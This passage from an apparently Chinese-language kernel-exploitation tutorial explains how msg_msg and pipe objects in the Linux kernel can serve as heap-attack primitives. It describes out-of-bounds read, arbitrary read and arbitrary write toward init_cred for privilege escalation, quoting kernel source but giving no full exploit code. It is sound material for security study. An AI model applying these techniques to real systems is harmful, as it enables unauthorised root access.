      <p>一般而言，我们使用<code>msg_msg</code>进行堆构造（比如溢出或者其他什么的）的时候，当需要从消息队列中读取消息而又不想释放该堆块时，会结合<code>MSG_COPY</code>这个<code>msgflg</code>标志位，防止在读取的时候发生堆块释放从而进行双向循环链表的<code>unlink</code>触发错误。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 do_msgrcv()函数中的</span></span><br><span class="line"><span class="comment">/* If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment">    * not update queue parameters.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">    msg = copy_msg(msg, copy);</span><br><span class="line">    <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//下面是unlink的部分,如果msg_msg结构被修改了可能会出错的</span></span><br><span class="line">list_del(&amp;msg-&gt;m_list);</span><br><span class="line">msq-&gt;q_qnum--;</span><br><span class="line">msq-&gt;q_rtime = ktime_get_real_seconds();</span><br><span class="line">ipc_update_pid(&amp;msq-&gt;q_lrpid, task_tgid(current));</span><br><span class="line">msq-&gt;q_cbytes -= msg-&gt;m_ts;</span><br><span class="line">atomic_sub(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);</span><br><span class="line">atomic_dec(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">ss_wakeup(msq, &amp;wake_q, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span> out_unlock0;</span><br></pre></td></tr></table></div></figure>

<p>使用这个标志位还需要在内核编译的时候设置<code>CONFIG_CHECKPOINT_RESTORE=y</code>才行，否则还是会出错的</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msgutil.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CHECKPOINT_RESTORE</span></span><br><span class="line"><span class="function">struct msg_msg *<span class="title">copy_msg</span><span class="params">(struct msg_msg *src, struct msg_msg *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//正常的一些数据复制</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="comment">//如果没有设置CONFIG_CHECKPOINT_RESTORE=y则会出错</span></span><br><span class="line"><span class="function">struct msg_msg *<span class="title">copy_msg</span><span class="params">(struct msg_msg *src, struct msg_msg *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(-ENOSYS);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></div></figure>

<p>🔺注：还有一点不知道是不是什么bug，在某些内核版本中，至少我的<code>v5.11</code>中，<code>MSG_NOERROR</code>和<code>MSG_COPY</code>（后续会讲到）没有办法同时生效，关键点在于<code>copy_msg()</code>函数中，转化成汇编如下：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220512163536660.png" alt="image-20220512163536660"></p>
<p>注意到红框的部分，获取<code>rdi(msg)</code>和<code>rsi(copy)</code>对应的<code>m_ts</code>进行比较，而<code>copy</code>的<code>m_ts</code>是从用户传进来的想要获取消息的长度，如果小于实际的<code>msg</code>的<code>m_ts</code>长度，那就标记错误然后退出。可以这个比较应该是在后面才会进行的，但是这里也突然冒出来，就很奇怪，导致这两个标志位没办法同时发挥作用。</p>

        <h5 id="B-释放堆块的消息读取"   >
          <a href="#B-释放堆块的消息读取" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-释放堆块的消息读取" class="headerlink" title="B.释放堆块的消息读取"></a>B.释放堆块的消息读取</h5>
      <p>同理如果不指定<code>MSG_COPY</code>这个标志时，从消息队列中读取消息就会触发内存释放，这里就可以依据发送消息时设置的<code>mtype</code>和接收消息时设置的<code>msgtpy</code>来进行消息队列中各个位置的堆块的释放。</p>

        <h5 id="C-数据复制"   >
          <a href="#C-数据复制" class="heading-link"><i class="fas fa-link"></i></a><a href="#C-数据复制" class="headerlink" title="C.数据复制"></a>C.数据复制</h5>
      <p>不管什么标志位，只要不是<code>MSG_NOERROR</code>和<code>MSG_COPY</code>联合起来，并且申请读取消息长度<code>size</code>小于通过<code>find_msg()</code>函数获取到的实际消息的<code>m_ts</code>，那么最终都会走到do_msgrcv()函数的末尾，通过如下代码进行数据复制和堆块释放</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">free_msg(msg);</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-利用"   >
          <a href="#3-利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-利用" class="headerlink" title="(3)利用"></a>(3)利用</h3>
      
        <h4 id="越界读取"   >
          <a href="#越界读取" class="heading-link"><i class="fas fa-link"></i></a><a href="#越界读取" class="headerlink" title="越界读取"></a>越界读取</h4>
      <p>这样，当我们通过之前提到的<code>double-free/UAF</code>，并且再使用<code>setxattr</code>来对<code>msg_msgmsg</code>中的<code>m_ts</code>进行修改，这样在我们调用<code>msgrcv</code>的时候就能越界从堆上读取内存了，就可能能够泄露到堆地址或者程序基地址。</p>
<p><strong>使用<code>setxattr</code>的时候需要注意释放堆块时FD的位置，不同内核版本开启不同保护下FD的位置不太一样</strong></p>
<p>为了获取到地址的成功性更大，我们就需要用到单个<code>msg_queue</code>和单个<code>msg_msg</code>的内存模型</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511113542467.png" alt="image-20220511113542467"></p>
<p>可以看到单个<code>msg_msg</code>在<code>msg_queue</code>的管理下形成双向循环链表，所以如果我们通过<code>msgget</code>和<code>msgsnd</code>多申请一些相同大小的且只有一个<code>msg_msg</code>结构体的<code>msg_queue</code>，那么越界读取的时候，就可以读取到只有单个<code>msg_msg</code>的头部了</p>
<p>而单个<code>msg_msg</code>由于双向循环链表，其头部中又存在指向<code>msg_queue</code>的指针，那么这样就能泄露出<code>msg_queue</code>的堆地址了。</p>

        <h4 id="任意读取"   >
          <a href="#任意读取" class="heading-link"><i class="fas fa-link"></i></a><a href="#任意读取" class="headerlink" title="任意读取"></a>任意读取</h4>
      <p>完成上述泄露<code>msg_queue</code>的堆地址之后，就需要用到<code>msg_msg</code>的内存布局了</p>
<p>由于我们的<code>msg_msg</code>消息的内存布局如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203122041731.png" alt="5IcVxRaFQtg3HCW"></p>
<p>相关读取源码如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v4.9----ipc/msgutil.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATALEN_MSG	((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATALEN_SEG	((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))</span></span><br><span class="line">----------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">store_msg</span><span class="params">(<span class="keyword">void</span> __user *dest, struct msg_msg *msg, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> (copy_to_user(dest, msg + <span class="number">1</span>, alen))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		dest = (<span class="keyword">char</span> __user *)dest + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_to_user(dest, seg + <span class="number">1</span>, alen))</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>所以如果我们可以修改<code>next</code>指针和<code>m_ts</code>，结合读取<code>msg</code>最终调用函数<code>store_msg</code>的源码，那么就能够实现任意读取。</p>
<p>那么接着上面的，我们得到<code>msg_queue</code>之后，可以再将<code>msg_msg</code>的next指针指回<code>msg_queue</code>，读出其中的<code>msg_msg</code>，就能获得当前可控堆块的堆地址。</p>
<p>这样完成之后，我们结合<code>userfaultfd</code>和<code>setxattr</code>频繁修改next指针就能基于当前堆地址来进行内存搜索了，从而能够完成地址泄露。</p>
<p>同时需要注意的是，判断链表是否结束的依据为next是否为null，所以我们任意读取的时候，最好找到一个地方的next指针处的值为null。</p>

        <h4 id="任意写"   >
          <a href="#任意写" class="heading-link"><i class="fas fa-link"></i></a><a href="#任意写" class="headerlink" title="任意写"></a>任意写</h4>
      <p>同样的，<code>msg_msg</code>由于next指针的存在，结合<code>msgsnd</code>也具备任意地址写的功能。我们可以在拷贝的时候利用<code>userfaultfd</code>停下来，然后更改next指针，使其指向我们需要的地方，比如<code>init_cred</code>结构体位置，从而直接修改进行提权。</p>

        <h2 id="2-pipe管道—kmalloc-1024-kmalloc-192"   >
          <a href="#2-pipe管道—kmalloc-1024-kmalloc-192" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-pipe管道—kmalloc-1024-kmalloc-192" class="headerlink" title="2.pipe管道—kmalloc-1024/kmalloc-192"></a>2.pipe管道—kmalloc-1024/kmalloc-192</h2>
      <p>参照：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Rong_Toa/article/details/116270704" >(31条消息) Linux系统调用：pipe()系统调用源码分析_rtoax的博客-CSDN博客_linux pipe 源码</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>****</p>
<p>通常来讲，管道用来在父进程和子进程之间通信，因为<code>fork</code>出来的子进程会继承父进程的文件描述符副本。这里就使用当前进程来创建管道符，从管道的读取端(<code>pipe_fd[0]</code>)和写入端(<code>pipe_fd[1]</code>)来进行利用。</p>

        <h3 id="1-使用方法-1"   >
          <a href="#1-使用方法-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-使用方法-1" class="headerlink" title="(1)使用方法"></a>(1)使用方法</h3>
      
        <h4 id="①创建-2"   >
          <a href="#①创建-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#①创建-2" class="headerlink" title="①创建"></a>①创建</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用pipe或者pipe2</span></span><br><span class="line"><span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">pipe(pipe_fd);<span class="comment">//默认阻塞状态</span></span><br><span class="line"><span class="comment">//pipe2(pipe_fd,flag);</span></span><br></pre></td></tr></table></div></figure>

<p>其中<code>pipe2</code>函数或者系统调用<code>__NR_pipe2</code>的<code>flag</code>支持除0之外的三种模式，可用在<code>man</code>手册中查看。</p>
<p>如果传入的<code>flag</code>为0，则和<code>pipe</code>函数是一样的，是阻塞的。</p>
<p>阻塞状态：即当没有数据在管道中时，如果还调用<code>read</code>从管道读取数据，那么就会使得程序处于阻塞状态，其他的也是类似的情况。</p>
<p>会默认创建两个fd文件描述符的，该fd文件描述符效果的相关结构如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9  /fs/pipe.c</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">pipefifo_fops</span> =</span> &#123;</span><br><span class="line">	.open		= fifo_open,</span><br><span class="line">	.llseek		= no_llseek,</span><br><span class="line">	.read_iter	= pipe_read,</span><br><span class="line">	.write_iter	= pipe_write,</span><br><span class="line">	.poll		= pipe_poll,</span><br><span class="line">	.unlocked_ioctl	= pipe_ioctl,</span><br><span class="line">	.release	= pipe_release,</span><br><span class="line">	.fasync		= pipe_fasync,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>放入到<code>pipe_fd</code>中，如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line">pipe(pipe_fd);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pipe_fd[0]:%d\n&quot;</span>,pipe_fd[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pipe_fd[1]:%d\n&quot;</span>,pipe_fd[<span class="number">1</span>]);</span><br></pre></td></tr></table></div></figure>

<p>效果如下：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509161948796.png" alt="image-20220509161948796"></p>
<p>之后使用<code>write/read</code>来写入读取即可，注意写入端为<code>fd[1]</code>，读取端为<code>fd[0]</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">0x8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span>* msg = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;</span><br><span class="line">write(pipe_fd[<span class="number">1</span>],msg,<span class="number">0x8</span>);</span><br><span class="line">read(pipe_fd[<span class="number">0</span>],buf,<span class="number">0x8</span>);</span><br></pre></td></tr></table></div></figure>




        <h4 id="②释放-1"   >
          <a href="#②释放-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#②释放-1" class="headerlink" title="②释放"></a>②释放</h4>
      <p>由于<code>pipe</code>管道创建后会对应创建文件描述符，所以释放两端对应的文件描述符即可释放管道<code>pipe</code>管道</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line">close(pipe_fd[<span class="number">1</span>]);</span><br></pre></td></tr></table></div></figure>

<p>需要将两个文件描述符fd都给释放掉或者使用<code>read</code>将管道中所有数据都读取出来，才会进入<code>free_pipe_info</code>函数来释放在线性映射区域申请的相关内存资源，否则还是不会进入的。</p>

        <h3 id="2-内存分配与释放-1"   >
          <a href="#2-内存分配与释放-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-内存分配与释放-1" class="headerlink" title="(2)内存分配与释放"></a>(2)内存分配与释放</h3>
      
        <h4 id="①分配"   >
          <a href="#①分配" class="heading-link"><i class="fas fa-link"></i></a><a href="#①分配" class="headerlink" title="①分配"></a>①分配</h4>
      <p>发生在调用<code>pipe</code>/<code>pipe2</code>函数，或者系统调用<code>__NR_pipe</code>/<code>__NR_pipe2</code>时，内核入口为</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE2(pipe2, <span class="keyword">int</span> __user *, fildes, <span class="keyword">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> do_pipe2(fildes, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE1(pipe, <span class="keyword">int</span> __user *, fildes) <span class="comment">/* pipe() 系统调用 */</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> do_pipe2(fildes, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>函数调用链：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">do_pipe2()-&gt;__do_pipe_flags()-&gt;create_pipe_files()-&gt;get_pipe_inode()-&gt;alloc_pipe_info()</span><br></pre></td></tr></table></div></figure>

<p>调用之后会在内核的线性映射区域进行内存分配，也就是常见的内核堆管理的区域。分配点在如下函数中：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function">struct pipe_inode_info *<span class="title">alloc_pipe_info</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> pipe_bufs = PIPE_DEF_BUFFERS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//#define PIPE_DEF_BUFFERS	16</span></span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//pipe_inode_info管理结构，大小为0xa0，属于kmalloc-192</span></span><br><span class="line">	pipe = kzalloc(<span class="keyword">sizeof</span>(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (pipe == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">goto</span> out_free_uid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//相关的消息结构为pipe_buffer数组,总共16*0x28=0x280,直接从kmalloc-1024中拿取堆块</span></span><br><span class="line">	pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="keyword">sizeof</span>(struct pipe_buffer),</span><br><span class="line">			     GFP_KERNEL_ACCOUNT);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">	<span class="comment">//对申请的pipe管道进行一些初始化</span></span><br><span class="line">	<span class="keyword">if</span> (pipe-&gt;bufs) &#123;</span><br><span class="line">		init_waitqueue_head(&amp;pipe-&gt;rd_wait);</span><br><span class="line">		init_waitqueue_head(&amp;pipe-&gt;wr_wait);</span><br><span class="line">		pipe-&gt;r_counter = pipe-&gt;w_counter = <span class="number">1</span>;</span><br><span class="line">		pipe-&gt;max_usage = pipe_bufs;</span><br><span class="line">		pipe-&gt;ring_size = pipe_bufs;</span><br><span class="line">		pipe-&gt;nr_accounted = pipe_bufs;</span><br><span class="line">		pipe-&gt;user = user;</span><br><span class="line">		mutex_init(&amp;pipe-&gt;mutex);</span><br><span class="line">		<span class="keyword">return</span> pipe;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//出错的话则会释放掉，具体干啥的不太清楚</span></span><br><span class="line">out_free_uid:</span><br><span class="line">	free_uid(user);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>相关的<code>pipe_inode_info</code>结构如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line">	<span class="keyword">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> head;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> tail;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> max_usage;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="keyword">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> nr_accounted;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> readers;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> writers;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> files;<span class="comment">//文件描述符计数，都为0时才会释放管道</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> r_counter;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> w_counter;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line">    <span class="comment">//pipe_buffer数组,16个,每个大小为0xa0,通常我们从这上面泄露地址或者劫持程序流</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>




        <h4 id="②释放-2"   >
          <a href="#②释放-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#②释放-2" class="headerlink" title="②释放"></a>②释放</h4>
      <p>直接使用<code>close</code>函数释放管道相关的文件描述符fd两端。</p>
<p>函数链调用链：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pipe_release()-&gt;put_pipe_info()-&gt;free_pipe_info()</span><br></pre></td></tr></table></div></figure>

<p>需要注意的时，在<code>put_pipe_info</code>函数中</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">put_pipe_info</span><span class="params">(struct inode *inode, struct pipe_inode_info *pipe)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> kill = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	spin_lock(&amp;inode-&gt;i_lock);</span><br><span class="line">	<span class="keyword">if</span> (!--pipe-&gt;files) &#123;</span><br><span class="line">		inode-&gt;i_pipe = <span class="literal">NULL</span>;</span><br><span class="line">		kill = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	spin_unlock(&amp;inode-&gt;i_lock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//当files为0才会进入该函数</span></span><br><span class="line">	<span class="keyword">if</span> (kill)</span><br><span class="line">		free_pipe_info(pipe);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>只有<code>pipe_inode_info</code>这个管理结构中的<code>files</code>成员为0，才会进行释放，也就是管道两端都关闭掉才行。</p>
<p>相关释放函数<code>free_pipe_info</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_pipe_info</span><span class="params">(struct pipe_inode_info *pipe)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="comment">//和管道相关的释放有关，也是相关的漏洞点</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pipe-&gt;ring_size; i++) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> pipe-&gt;bufs + i;</span><br><span class="line">		<span class="keyword">if</span> (buf-&gt;ops)</span><br><span class="line">			pipe_buf_release(pipe, buf);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="comment">//释放pipe_buffer数组,kmalloc-1024</span></span><br><span class="line">	kfree(pipe-&gt;bufs);</span><br><span class="line">    <span class="comment">//释放pipe_inode_info管理结构,kmalloc-192</span></span><br><span class="line">	kfree(pipe);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h3 id="3-利用-1"   >
